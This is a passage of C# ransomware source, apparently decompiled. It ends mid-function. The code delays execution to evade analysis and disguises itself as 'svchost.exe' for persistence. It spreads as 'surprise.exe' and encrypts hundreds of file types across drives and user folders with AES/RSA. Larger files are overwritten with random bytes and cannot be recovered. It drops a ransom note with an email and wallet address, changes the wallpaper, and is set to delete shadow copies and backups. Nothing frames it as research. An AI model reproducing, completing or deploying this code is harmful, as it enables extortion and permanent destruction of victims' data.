using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace ConsoleApplication7;

internal class Program
{
	public static class NativeMethods
	{
		public const int clp = 797;

		public static IntPtr intpreclp = new IntPtr(-3);

		[DllImport("user32.dll", SetLastError = true)]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool AddClipboardFormatListener(IntPtr hwnd);

		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SetParent(IntPtr hWndChild, IntPtr hWndNewParent);
	}

	private static string userName = Environment.UserName;

	private static string userDir = "C:\\Users\\";

	public static string appMutexRun = "7z459ajrk722yn8c5j4fg";

	public static bool encryptionAesRsa = true;

	public static string encryptedFileExtension = "";

	private static bool checkSpread = true;

	private static string spreadName = "surprise.exe";

	private static bool checkCopyRoaming = true;

	private static string processName = "svchost.exe";

	public static string appMutexRun2 = "2X28tfRmWaPyPQgvoHV";

	private static bool checkStartupFolder = true;

	private static bool checkSleep = true;

	private static int sleepTextbox = 2332800;

	private static string base64Image = "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";

	public static string appMutexStartup = "1qw0ll8p9m8uezhqhyd";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = true;

	private static bool checkdeleteShadowCopies = true;

	private static bool checkdisableRecoveryMode = true;

	private static bool checkdeleteBackupCatalog = true;

	public static string appMutexStartup2 = "17CqMQFeuB3NTzJ";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static string[] messages = new string[7] { "your computer are locked due to you falling victim to ransomware. ", "", "to enquire about decryption", "email phillip_kuznetsova@fbi.ac", "", "42KwLVv18KiFRZNHzuYNocRrrGdnGbPYAGDT9oHzwh6sMk1f53SVNN26X877au2DPq73BGzLAz9VSbkdBdMPjvtn68qd4CP", "" };

	private static string[] validExtensions = new string[229]
	{
		".txt", ".jar", ".dat", ".contact", ".settings", ".doc", ".docx", ".xls", ".xlsx", ".ppt",
		".pptx", ".odt", ".jpg", ".mka", ".mhtml", ".oqy", ".png", ".csv", ".py", ".sql",
		".mdb", ".php", ".asp", ".aspx", ".html", ".htm", ".xml", ".psd", ".pdf", ".xla",
		".cub", ".dae", ".indd", ".cs", ".mp3", ".mp4", ".dwg", ".zip", ".rar", ".mov",
		".rtf", ".bmp", ".mkv", ".avi", ".apk", ".lnk", ".dib", ".dic", ".dif", ".divx",
		".iso", ".7zip", ".ace", ".arj", ".bz2", ".cab", ".gzip", ".lzh", ".tar", ".jpeg",
		".xz", ".mpeg", ".torrent", ".mpg", ".core", ".pdb", ".ico", ".pas", ".db", ".wmv",
		".swf", ".cer", ".bak", ".backup", ".accdb", ".bay", ".p7c", ".exif", ".vss", ".raw",
		".m4a", ".wma", ".flv", ".sie", ".sum", ".ibank", ".wallet", ".css", ".js", ".rb",
		".crt", ".xlsm", ".xlsb", ".7z", ".cpp", ".java", ".jpe", ".ini", ".blob", ".wps",
		".docm", ".wav", ".3gp", ".webm", ".m4v", ".amv", ".m4p", ".svg", ".ods", ".bk",
		".vdi", ".vmdk", ".onepkg", ".accde", ".jsp", ".json", ".gif", ".log", ".gz", ".config",
		".vb", ".m1v", ".sln", ".pst", ".obj", ".xlam", ".djvu", ".inc", ".cvs", ".dbf",
		".tbi", ".wpd", ".dot", ".dotx", ".xltx", ".pptm", ".potx", ".potm", ".pot", ".xlw",
		".xps", ".xsd", ".xsf", ".xsl", ".kmz", ".accdr", ".stm", ".accdt", ".ppam", ".pps",
		".ppsm", ".1cd", ".3ds", ".3fr", ".3g2", ".accda", ".accdc", ".accdw", ".adp", ".ai",
		".ai3", ".ai4", ".ai5", ".ai6", ".ai7", ".ai8", ".arw", ".ascx", ".asm", ".asmx",
		".avs", ".bin", ".cfm", ".dbx", ".dcm", ".dcr", ".pict", ".rgbe", ".dwt", ".f4v",
		".exr", ".kwm", ".max", ".mda", ".mde", ".mdf", ".mdw", ".mht", ".mpv", ".msg",
		".myi", ".nef", ".odc", ".geo", ".swift", ".odm", ".odp", ".oft", ".orf", ".pfx",
		".p12", ".pl", ".pls", ".safe", ".tab", ".vbs", ".xlk", ".xlm", ".xlt", ".xltm",
		".svgz", ".slk", ".tar.gz", ".dmg", ".ps", ".psb", ".tif", ".rss", ".key", ".vob",
		".epsp", ".dc3", ".iff", ".onepkg", ".onetoc2", ".opt", ".p7b", ".pam", ".r3d"
	};

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			addLinkToStartup();
		}
		lookForDirectories();
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
		}
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static byte[] random_bytes(int length)
	{
		Random random = new Random();
		length++;
		byte[] array = new byte[length];
		random.NextBytes(array);
		return array;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	public static string randomEncode(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return "<EncyptedKey>" + Base64EncodeString(RandomString(41)) + "<EncyptedKey> " + RandomString(2) + Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					if (fileInfo.Length < 2117152)
					{
						if (encryptionAesRsa)
						{
							EncryptFile(files[i]);
						}
					}
					else if (fileInfo.Length > 200000000)
					{
						Random random = new Random();
						int length = random.Next(200000000, 300000000);
						string @string = Encoding.UTF8.GetString(random_bytes(length));
						File.WriteAllText(files[i], randomEncode(@string));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					else
					{
						string string2 = Encoding.UTF8.GetString(random_bytes(Convert.ToInt32(fileInfo.Length) / 4));
						File.WriteAllText(files[i], randomEncode(string2));
						File.Move(files[i], files[i] + "." + RandomStringForExtension(4));
					}
					if (flag)
					{
						flag = false;
						File.WriteAllLines(location + "/" + droppedMessageTextbox, messages);
					}
				}
				catch
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>w1wfmspJD9jZ/dyPENJOlWyYmUADNa0cZk/q8kufiuq0XM1sK8W7ucADORgl/M7J05Thzjl5lwA9kdrTz+PB7FUi9MCOnd8Pws7Kk4r/h/8cYkohE46GiihLy33CpmnCGzYjGtN5eHq/6Le3E3KC/Ik7bZ+q3ble+BaUHYP0WQU=</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
